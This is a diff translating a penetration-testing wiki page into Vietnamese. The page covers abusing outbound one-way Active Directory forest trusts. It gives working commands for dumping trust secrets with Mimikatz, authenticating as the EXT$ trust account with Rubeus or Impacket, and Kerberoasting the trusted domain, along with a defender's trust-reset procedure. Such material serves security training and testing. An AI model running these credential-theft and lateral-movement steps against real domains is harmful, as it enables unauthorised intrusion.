@@ -1,12 +1,12 @@
-# External Forest Domain - One-Way (Outbound)
+# Domain Forest Bên Ngoài - Một Chiều (Outbound)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario **your domain** is **trusting** some **privileges** to principals from a **different domain/forest**.
+Trong tình huống này, **domain của bạn** đang **trust** một số **privileges** dành cho các principal từ **domain/forest khác**.
 
 ## Enumeration
 
-### Outbound Trust
+### Trust Outbound
 
 ```bash
 # Notice Outbound trust
@@ -30,7 +30,7 @@ MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=F
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
 
-If you have the AD module available, inspect the **Trusted Domain Object (TDO)** directly as well. This gives you the raw LDAP-backed trust data you will later need when deciding whether the easy path is **FSP/group abuse** or **trust-account abuse**:
+Nếu bạn có AD module, hãy kiểm tra trực tiếp **Trusted Domain Object (TDO)**. Thao tác này cung cấp dữ liệu trust thô được lưu trong LDAP, cần thiết sau này để quyết định liệu hướng dễ hơn là **lạm dụng FSP/group** hay **lạm dụng trust-account**:
 
 ```powershell
 # Enumerate the TDO created for the foreign forest/domain
@@ -41,45 +41,45 @@ Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$(
 Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
 ```
 
-You should also enumerate where the foreign principals from `CN=ForeignSecurityPrincipals` were actually granted access. Common wins are:
+Bạn cũng nên liệt kê những nơi mà các principal từ `CN=ForeignSecurityPrincipals` thực sự được cấp quyền truy cập. Những trường hợp thường gặp là:
 
-- **Local admin** on a server/DC in your current domain
-- Membership in a **custom domain group** that has ACLs over users/computers/GPOs
-- Rights to modify **computer objects**, which can later become [RBCD](resource-based-constrained-delegation.md) if the trust configuration allows it
+- **Local admin** trên một server/DC trong domain hiện tại của bạn
+- Thành viên của **custom domain group** có ACL trên users/computers/GPOs
+- Quyền sửa đổi **computer objects**, sau này có thể trở thành [RBCD](resource-based-constrained-delegation.md) nếu cấu hình trust cho phép
 
 ## Trust Account Attack
 
-When a one-way trust is created from domain/forest **B** to domain/forest **A** (**B trusts A**), a **trust account** for **B** is created in **A**. In the outbound-trust view of **A**, this is useful because if you later compromise **B** (the trusting side), you can dump the trust secret there and authenticate back to **A** as `B$`.<sup>[[1]](#references)</sup>
+Khi tạo one-way trust từ domain/forest **B** sang domain/forest **A** (**B trusts A**), một **trust account** cho **B** sẽ được tạo trong **A**. Trong góc nhìn outbound-trust của **A**, điều này hữu ích vì nếu sau đó bạn compromise **B** (phía trusting), bạn có thể dump trust secret tại đó rồi xác thực ngược lại vào **A** với danh tính `B$`.<sup>[[1]](#references)</sup>
 
-The critical aspect to understand here is that the password and Kerberos material for that trust account can be extracted from a Domain Controller in the **trusting** domain using:<sup>[[1]](#references)</sup>
+Điều quan trọng cần hiểu là password và Kerberos material của trust account đó có thể được trích xuất từ Domain Controller trong domain **trusting** bằng cách:<sup>[[1]](#references)</sup>
 
 ```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
 
-This works because the trust account created in the **trusted** domain is an enabled principal that ends up with the baseline rights of a normal domain user there. That is often enough to start enumerating LDAP, request tickets, and find the next escalation path.<sup>[[1]](#references)</sup>
+Điều này hoạt động vì tài khoản trust được tạo trong domain **trusted** là một principal được bật và có các quyền cơ bản của người dùng domain thông thường tại đó. Điều này thường đủ để bắt đầu liệt kê LDAP, yêu cầu ticket và tìm đường leo thang tiếp theo.<sup>[[1]](#references)</sup>
 
-In a scenario where `ext.local` is the **trusting** domain and `root.local` is the **trusted** domain, a user account named `EXT$` is created inside `root.local`. Dumping the trust keys from `ext.local` reveals credentials that can be used as `root.local\EXT$` against `root.local`:<sup>[[1]](#references)</sup>
+Trong kịch bản `ext.local` là domain **trusting** và `root.local` là domain **trusted**, một tài khoản người dùng tên `EXT$` được tạo bên trong `root.local`. Dump các khóa trust từ `ext.local` sẽ tiết lộ thông tin xác thực có thể dùng dưới dạng `root.local\EXT$` để truy cập `root.local`:<sup>[[1]](#references)</sup>
 
 ```bash
 lsadump::trust /patch
 ```
 
-Following this, use the extracted **RC4** key to authenticate as `root.local\EXT$` inside `root.local`:<sup>[[1]](#references)</sup>
+Tiếp theo, sử dụng key **RC4** đã trích xuất để xác thực với tư cách `root.local\EXT$` trong `root.local`:<sup>[[1]](#references)</sup>
 
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
 
-Then enumerate the trusted domain as that principal, for example by Kerberoasting a high-value SPN in `root.local`:<sup>[[1]](#references)</sup>
+Sau đó enumerate trusted domain với tư cách principal đó, chẳng hạn bằng cách Kerberoasting một SPN có giá trị cao trong `root.local`:<sup>[[1]](#references)</sup>
 
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
 
-### From Linux
+### Từ Linux
 
-If you recovered the **RC4** trust-account key, the same idea works from Linux with Impacket:
+Nếu bạn đã khôi phục khóa tài khoản trust **RC4**, cách làm tương tự cũng hoạt động trên Linux với Impacket:
 
 ```bash
 python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
@@ -92,41 +92,41 @@ GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outpu
 GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
 ```
 
-If **RC4** is not accepted, fall back to the recovered **cleartext password** (or derived **AES** keys) and reuse the usual [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) and [Kerberoast](kerberoast.md) workflows from that foothold.
+Nếu **RC4** không được chấp nhận, hãy dùng **mật khẩu cleartext** đã khôi phục (hoặc các khóa **AES** được dẫn xuất), rồi tái sử dụng các workflow [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) và [Kerberoast](kerberoast.md) thông thường từ foothold đó.
 
-### Key material gotchas
+### Các điểm cần lưu ý về key material
 
-Don't mix up **trust keys** and **trust-account credentials**:<sup>[[1]](#references)</sup>
+Đừng nhầm lẫn **trust keys** với **trust-account credentials**:<sup>[[1]](#references)</sup>
 
-- In a one-way trust, both sides store a **TDO**, but the actual **`EXT$` user account only exists in the trusted domain**.
-- The current trust-account password is reflected in the TDO trust secret (`NewPassword` / current trust key).
-- The **RC4** trust key is the easiest artifact to reuse for `asktgt` as the trust account; in default setups this is usually the working enctype because the trust account often has a blank `msDS-SupportedEncryptionTypes`.
-- If you are thinking in terms of **AES trust keys**, remember they are not interchangeable with the trust-account AES keys because the salts differ.
+- Trong one-way trust, cả hai phía đều lưu một **TDO**, nhưng tài khoản người dùng **`EXT$`** thực sự chỉ tồn tại trong trusted domain.
+- Mật khẩu hiện tại của trust account được phản ánh trong trust secret của TDO (`NewPassword` / trust key hiện tại).
+- **RC4** trust key là artifact dễ tái sử dụng nhất cho `asktgt` dưới danh nghĩa trust account; trong các thiết lập mặc định, đây thường là enctype hoạt động được vì trust account thường có `msDS-SupportedEncryptionTypes` để trống.
+- Nếu bạn đang nghĩ đến **AES trust keys**, hãy nhớ rằng chúng không thể thay thế cho AES keys của trust account vì salt khác nhau.
 
-So, for the technique on this page, prefer either the dumped **RC4** material or the recovered **cleartext** password.<sup>[[1]](#references)</sup>
+Vì vậy, với kỹ thuật trên trang này, hãy ưu tiên **RC4** material đã dump hoặc mật khẩu **cleartext** đã khôi phục.<sup>[[1]](#references)</sup>
 
-### Gathering cleartext trust password
+### Thu thập mật khẩu trust dạng cleartext
 
-In the previous flow it was used the trust hash instead of the **cleartext password** (that is also **dumped by mimikatz**).<sup>[[1]](#references)</sup>
+Trong flow trước, trust hash được dùng thay cho **mật khẩu cleartext** (cũng được **mimikatz dump**).<sup>[[1]](#references)</sup>
 
-The cleartext password can be obtained by converting the \[ CLEAR ] output from mimikatz from hexadecimal and removing null bytes `\x00`:<sup>[[1]](#references)</sup>
+Có thể lấy mật khẩu cleartext bằng cách chuyển đổi đầu ra \[ CLEAR ] từ mimikatz từ dạng hexadecimal và loại bỏ các null byte `\x00`:<sup>[[1]](#references)</sup>
 
-![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)
+![Trust Account Attack - Thu thập mật khẩu trust dạng cleartext: Có thể lấy mật khẩu cleartext bằng cách chuyển đổi đầu ra ( CLEAR ) từ mimikatz từ dạng hexadecimal và loại bỏ các null...](<../../images/image (938).png>)
 
-Sometimes when creating a trust relationship, a password must be typed in by the user for the trust. In this demonstration, the key is the original trust password and therefore human readable. As the key rotates (default: every 30 days), the cleartext will usually stop being human readable but is still technically usable.<sup>[[1]](#references)</sup>
+Đôi khi, khi tạo trust relationship, người dùng phải nhập mật khẩu cho trust. Trong minh họa này, key là mật khẩu trust ban đầu nên con người có thể đọc được. Khi key được xoay vòng (mặc định: mỗi 30 ngày), cleartext thường không còn đọc được bằng mắt, nhưng về mặt kỹ thuật vẫn có thể sử dụng.<sup>[[1]](#references)</sup>
 
-The cleartext password can be used to perform regular authentication as the trust account, as an alternative to requesting a TGT with the Kerberos secret key of the trust account. Here, querying `root.local` from `ext.local` for members of `Domain Admins`:<sup>[[1]](#references)</sup>
+Có thể dùng mật khẩu cleartext để xác thực thông thường dưới danh nghĩa trust account, thay vì yêu cầu TGT bằng Kerberos secret key của trust account. Ở đây, truy vấn `root.local` từ `ext.local` để tìm thành viên của `Domain Admins`:<sup>[[1]](#references)</sup>
 
-![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)
+![Trust Account Attack - Thu thập mật khẩu trust dạng cleartext: Có thể dùng mật khẩu cleartext để xác thực thông thường dưới danh nghĩa trust account, thay vì yêu cầu TGT...](<../../images/image (792).png>)
 
-### Practical limitations
+### Các hạn chế thực tế
 
 > [!WARNING]
-> Trust accounts are awkward principals. Interactive logons such as **RUNAS / console / RDP** are not the expected path here, and **NTLM** authentication attempts can fail with `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Plan for **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) instead.<sup>[[1]](#references)</sup>
+> Trust account là các principal khá khó xử lý. Đăng nhập tương tác như **RUNAS / console / RDP** không phải là cách dùng dự kiến ở đây, và các lần thử xác thực **NTLM** có thể thất bại với `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Hãy dùng **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>
 
-### Persistence / cleanup note
+### Lưu ý về persistence / cleanup
 
-If defenders realize the trusting domain was compromised, they should rotate the trust secret on **both sides** with `netdom trust ... /resetOneSide ...`. From an operator perspective this matters because a **manual reset invalidates the old trust material immediately**, while normal trust-password rotation keeps current/previous values around during rollover.<sup>[[2]](#references)</sup>
+Nếu defenders nhận ra trusting domain đã bị compromise, họ nên xoay trust secret ở **cả hai phía** bằng `netdom trust ... /resetOneSide ...`. Từ góc độ operator, điều này quan trọng vì **reset thủ công lập tức vô hiệu hóa trust material cũ**, trong khi quá trình xoay trust password thông thường giữ lại các giá trị hiện tại/trước đó trong thời gian rollover.<sup>[[2]](#references)</sup>
 
 ```bash
 # Run once from the trusted side
@@ -138,7 +138,6 @@ netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /us
 
 ## References
 
-- [1] [SID filter as security boundary between domains? (Part 7) – Trust account attack – from trusting to trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
-- [2] [AD Forest Recovery – Resetting a trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
-
+- [1] [SID filter như ranh giới bảo mật giữa các domain? (Phần 7) – Tấn công tài khoản trust – từ domain tin cậy đến domain được tin cậy](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
+- [2] [Khôi phục AD Forest – Đặt lại mật khẩu trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
 {{#include ../../banners/hacktricks-training.md}}
